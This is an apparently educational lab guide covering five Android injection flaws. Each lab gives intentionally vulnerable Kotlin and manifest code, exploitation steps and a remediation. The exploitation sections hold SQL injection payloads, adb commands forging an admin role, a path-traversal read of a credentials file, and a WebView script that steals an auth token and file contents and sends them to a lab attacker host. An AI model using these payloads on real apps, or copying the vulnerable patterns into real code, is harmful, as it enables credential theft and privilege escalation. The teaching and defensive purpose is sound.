# Injection Vulnerability Labs

> **DISCLAIMER**: All code in this document contains INTENTIONAL vulnerabilities for security education in isolated environments only. Never use vulnerable patterns in production. All data shown is synthetic. Exploitation techniques must only target the lab's own emulator and local backend, never real systems.

## Lab 1: SQL Injection via Raw Queries

**Learning Objective**: Demonstrate how unsanitized user input in raw SQL queries enables data extraction, and how parameterized queries prevent it.

**OWASP Mobile**: M7 — Client Code Quality

### Vulnerable Implementation

```kotlin
// SECURITY LAB: INTENTIONAL vulnerability — SQL injection
// VULNERABILITY: CWE-89 — Improper neutralization of special elements in SQL

@Dao
interface InsecureUserDao {

    // VULNERABILITY: @RawQuery with string concatenation allows injection
    @RawQuery
    fun rawSearch(query: SupportSQLiteQuery): List<LabUser>
}

class InsecureSearchRepository(private val dao: InsecureUserDao) {

    // VULNERABILITY: User input concatenated directly into SQL
    fun searchUsers(nameQuery: String): List<LabUser> {
        val sql = "SELECT * FROM lab_users WHERE name LIKE '%$nameQuery%'"
        return dao.rawSearch(SimpleSQLiteQuery(sql))
    }
}
```

### Exploitation Steps

```bash
# 1. In the app's search field, enter a SQL injection payload:
#    ' OR 1=1 --
# This modifies the query to: SELECT * FROM lab_users WHERE name LIKE '%' OR 1=1 --%'
# Result: all records returned, including synthetic SSNs and credit cards.

# 2. UNION-based extraction:
#    ' UNION SELECT 1,sql,3,4,5 FROM sqlite_master --
# This returns the schema of every table in the database.

# 3. Via adb, trigger the search programmatically:
adb shell am start -n com.securitylab.injection.vulnerable.lab/.SearchActivity \
    --es query "' OR 1=1 --"
```

### Remediation

```kotlin
// FIX: Use parameterized queries — Room's @Query handles binding safely
@Dao
interface SecureUserDao {

    // FIX: Room binds :name safely — no injection possible
    @Query("SELECT * FROM lab_users WHERE name LIKE '%' || :name || '%'")
    fun searchUsers(name: String): List<LabUser>
}

class SecureSearchRepository(private val dao: SecureUserDao) {

    fun searchUsers(nameQuery: String): List<LabUser> {
        // FIX: Input is bound as a parameter, never interpolated into SQL
        return dao.searchUsers(nameQuery)
    }
}
```

---

## Lab 2: Intent Injection via Exported Activities

**Learning Objective**: Show how exported Activities that trust incoming Intent extras without validation enable privilege escalation and data theft.

**OWASP Mobile**: M1 — Improper Platform Usage

### Vulnerable Implementation

```xml
<!-- SECURITY LAB: INTENTIONAL vulnerability — exported activity -->
<!-- VULNERABILITY: CWE-926 — Improper export of Android application component -->
<activity
    android:name=".AdminPanelActivity"
    android:exported="true">
    <!-- VULNERABILITY: No permission guard — any app can launch this -->
    <intent-filter>
        <action android:name="com.securitylab.injection.ADMIN_PANEL" />
        <category android:name="android.intent.category.DEFAULT" />
    </intent-filter>
</activity>
```

```kotlin
// SECURITY LAB: INTENTIONAL vulnerability — trusting Intent extras
// VULNERABILITY: CWE-20 — Improper input validation

class AdminPanelActivity : AppCompatActivity() {

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        // VULNERABILITY: Role taken directly from the incoming Intent — any app can set it
        val role = intent.getStringExtra("user_role") ?: "guest"
        if (role == "admin") {
            showAdminDashboard()  // VULNERABILITY: attacker-controlled privilege escalation
        }

        // VULNERABILITY: Arbitrary URL loaded from Intent extra
        val reportUrl = intent.getStringExtra("report_url")
        if (reportUrl != null) {
            webView.loadUrl(reportUrl)  // VULNERABILITY: attacker-controlled URL
        }
    }
}
```

### Exploitation Steps

```bash
# 1. Launch the admin panel from adb with an injected role:
adb shell am start -n com.securitylab.injection.vulnerable.lab/.AdminPanelActivity \
    --es user_role "admin"
# Result: full admin dashboard displayed without authentication.

# 2. From a malicious app installed in the lab emulator:
val intent = Intent("com.securitylab.injection.ADMIN_PANEL")
intent.putExtra("user_role", "admin")
intent.putExtra("report_url", "http://10.0.2.2:9999/phish")
startActivity(intent)
```

### Remediation

```kotlin
// FIX: Do not export sensitive Activities; validate all Intent data
class AdminPanelActivity : AppCompatActivity() {

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        // FIX: Verify authentication state from the app's own session, not the Intent
        val session = SessionManager.getInstance(this)
        if (!session.isAuthenticated || !session.currentUser.isAdmin) {
            finish()
            return
        }

        // FIX: Never load arbitrary URLs from Intent extras
        // If a URL is needed, validate against an allowlist
        val reportUrl = intent.getStringExtra("report_url")
        if (reportUrl != null && isAllowedReportUrl(reportUrl)) {
            webView.loadUrl(reportUrl)
        }
    }

    // FIX: Allowlist of trusted report origins
    private fun isAllowedReportUrl(url: String): Boolean {
        val allowed = listOf("https://reports.lab.local/")
        return allowed.any { url.startsWith(it) }
    }
}
```

```xml
<!-- FIX: Remove export or require a signature-level permission -->
<activity
    android:name=".AdminPanelActivity"
    android:exported="false" />
```

---

## Lab 3: Content Provider Path Traversal

**Learning Objective**: Demonstrate how a poorly configured Content Provider allows other apps to read arbitrary files from the app's private directory.

### Vulnerable Implementation

```kotlin
// SECURITY LAB: INTENTIONAL vulnerability — Content Provider path traversal
// VULNERABILITY: CWE-22 — Improper limitation of a pathname to a restricted directory

class InsecureFileProvider : ContentProvider() {

    // VULNERABILITY: Provider is exported and serves files based on URI path
    override fun openFile(uri: Uri, mode: String): ParcelFileDescriptor? {
        // VULNERABILITY: No path validation — "../" sequences traverse out of intended dir
        val file = File(context!!.filesDir, uri.lastPathSegment!!)
        return ParcelFileDescriptor.open(file, ParcelFileDescriptor.MODE_READ_ONLY)
    }
}
```

```xml
<!-- VULNERABILITY: Exported provider with no permission -->
<provider
    android:name=".InsecureFileProvider"
    android:authorities="com.securitylab.injection.files"
    android:exported="true"
    android:grantUriPermissions="true" />
```

### Exploitation Steps

```bash
# Read the app's SharedPreferences via path traversal:
adb shell content read \
    --uri content://com.securitylab.injection.files/..%2Fshared_prefs%2Fuser_creds.xml
# Output: plaintext credentials from the vulnerable storage lab
```

### Remediation

```kotlin
// FIX: Validate and canonicalize paths; use FileProvider from AndroidX
class SecureFileProvider : ContentProvider() {

    private val allowedDir by lazy { File(context!!.filesDir, "public_reports") }

    override fun openFile(uri: Uri, mode: String): ParcelFileDescriptor? {
        val requestedFile = File(allowedDir, uri.lastPathSegment!!)
        // FIX: Canonicalize and verify the resolved path is within the allowed directory
        val canonical = requestedFile.canonicalFile
        if (!canonical.path.startsWith(allowedDir.canonicalPath)) {
            throw SecurityException("Path traversal blocked: ${uri.path}")
        }
        return ParcelFileDescriptor.open(canonical, ParcelFileDescriptor.MODE_READ_ONLY)
    }
}
```

---

## Lab 4: WebView JavaScript Injection

**Learning Objective**: Show how enabling JavaScript and exposing a JavaScriptInterface in a WebView that loads untrusted content enables code execution.

### Vulnerable Implementation

```kotlin
// SECURITY LAB: INTENTIONAL vulnerability — insecure WebView
// VULNERABILITY: CWE-749 — Exposed dangerous method via JavaScript interface

class InsecureWebViewActivity : AppCompatActivity() {

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        val webView = WebView(this)
        // VULNERABILITY: JavaScript enabled on a WebView that loads external content
        webView.settings.javaScriptEnabled = true
        // VULNERABILITY: File access allows reading local files via file:// URLs
        webView.settings.allowFileAccess = true
        webView.settings.allowUniversalAccessFromFileURLs = true

        // VULNERABILITY: JavaScript bridge exposes native methods to page scripts
        webView.addJavascriptInterface(LabBridge(this), "NativeBridge")

        // VULNERABILITY: URL from Intent — attacker controls the loaded page
        val url = intent.getStringExtra("url") ?: "http://10.0.2.2:8080/dashboard"
        webView.loadUrl(url)

        setContentView(webView)
    }
}

// VULNERABILITY: Bridge methods accessible from any JavaScript on the page
class LabBridge(private val context: Context) {

    @JavascriptInterface
    fun getAuthToken(): String {
        // VULNERABILITY: Auth token exposed to any page loaded in this WebView
        return SessionManager.getInstance(context).getToken() ?: ""
    }

    @JavascriptInterface
    fun readFile(path: String): String {
        // VULNERABILITY: Arbitrary file read via JavaScript bridge
        return File(path).readText()
    }
}
```

### Exploitation Steps

```bash
# 1. Craft a malicious HTML page on the local lab server (10.0.2.2:8080):
# <script>
#   var token = NativeBridge.getAuthToken();
#   var data = NativeBridge.readFile("/data/data/com.securitylab.injection.vulnerable.lab/shared_prefs/user_creds.xml");
#   // Exfiltrate to attacker's lab server
#   fetch("http://10.0.2.2:9999/steal?token=" + token + "&data=" + encodeURIComponent(data));
# </script>

# 2. Launch the activity with the malicious URL:
adb shell am start -n com.securitylab.injection.vulnerable.lab/.InsecureWebViewActivity \
    --es url "http://10.0.2.2:8080/malicious.html"
```

### Remediation

```kotlin
// FIX: Restrict WebView capabilities and validate loaded URLs
class SecureWebViewActivity : AppCompatActivity() {

    private val allowedOrigins = setOf("https://dashboard.lab.local")

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        val webView = WebView(this)
        // FIX: Disable file access
        webView.settings.allowFileAccess = false
        webView.settings.allowUniversalAccessFromFileURLs = false
        webView.settings.allowFileAccessFromFileURLs = false

        // FIX: If JavaScript is needed, restrict to trusted origins only
        webView.settings.javaScriptEnabled = true

        // FIX: Validate URL before loading
        val url = intent.getStringExtra("url") ?: return
        if (allowedOrigins.none { url.startsWith(it) }) {
            finish()
            return
        }

        // FIX: Do NOT add JavaScript interfaces when loading external content
        // If a bridge is required, use postMessage / WebMessagePort instead
        webView.loadUrl(url)
        setContentView(webView)
    }
}
```

---

## Lab 5: Deep Link Scheme Hijacking

**Learning Objective**: Demonstrate how custom URI schemes without proper validation allow malicious apps to intercept or forge deep links.

### Vulnerable Implementation

```xml
<!-- SECURITY LAB: INTENTIONAL vulnerability — hijackable deep link -->
<!-- VULNERABILITY: CWE-939 — Improper authorization in handler for custom URL scheme -->
<activity android:name=".DeepLinkActivity" android:exported="true">
    <intent-filter>
        <action android:name="android.intent.action.VIEW" />
        <category android:name="android.intent.category.DEFAULT" />
        <category android:name="android.intent.category.BROWSABLE" />
        <!-- VULNERABILITY: Custom scheme — any app can register the same scheme -->
        <data android:scheme="labapp" android:host="callback" />
    </intent-filter>
</activity>
```

```kotlin
// SECURITY LAB: INTENTIONAL vulnerability — unvalidated deep link data
// VULNERABILITY: CWE-20 — Trusting parameters from deep link URI

class DeepLinkActivity : AppCompatActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        val uri = intent.data ?: return

        // VULNERABILITY: OAuth token extracted from deep link without origin validation
        val token = uri.getQueryParameter("token")
        if (token != null) {
            SessionManager.getInstance(this).saveToken(token)
        }

        // VULNERABILITY: Redirect target taken from deep link
        val redirect = uri.getQueryParameter("redirect")
        if (redirect != null) {
            startActivity(Intent(Intent.ACTION_VIEW, Uri.parse(redirect)))
        }
    }
}
```

### Exploitation Steps

```bash
# A malicious app registers the same scheme and intercepts the OAuth callback:
# labapp://callback?token=stolen_token_value

# Or, forge a deep link with an attacker-controlled redirect:
adb shell am start -a android.intent.action.VIEW \
    -d "labapp://callback?redirect=http://10.0.2.2:9999/phish"
```

### Remediation

```kotlin
// FIX: Use Android App Links (HTTPS verified) instead of custom schemes
// FIX: Validate all deep link parameters against server state
class SecureDeepLinkActivity : AppCompatActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        val uri = intent.data ?: return

        // FIX: Only accept links verified via Digital Asset Links (App Links)
        // FIX: Validate the token against a server-side session state (PKCE)
        val authCode = uri.getQueryParameter("code")
        if (authCode != null) {
            // FIX: Exchange auth code for token via server, not directly from URL
            AuthRepository.exchangeCodeForToken(authCode)
        }

        // FIX: Never follow redirects from deep link parameters
    }
}
```

```xml
<!-- FIX: Use App Links with autoVerify for verified HTTPS deep links -->
<activity android:name=".SecureDeepLinkActivity" android:exported="true">
    <intent-filter android:autoVerify="true">
        <action android:name="android.intent.action.VIEW" />
        <category android:name="android.intent.category.DEFAULT" />
        <category android:name="android.intent.category.BROWSABLE" />
        <data android:scheme="https" android:host="app.lab.local" android:pathPrefix="/callback" />
    </intent-filter>
</activity>
```
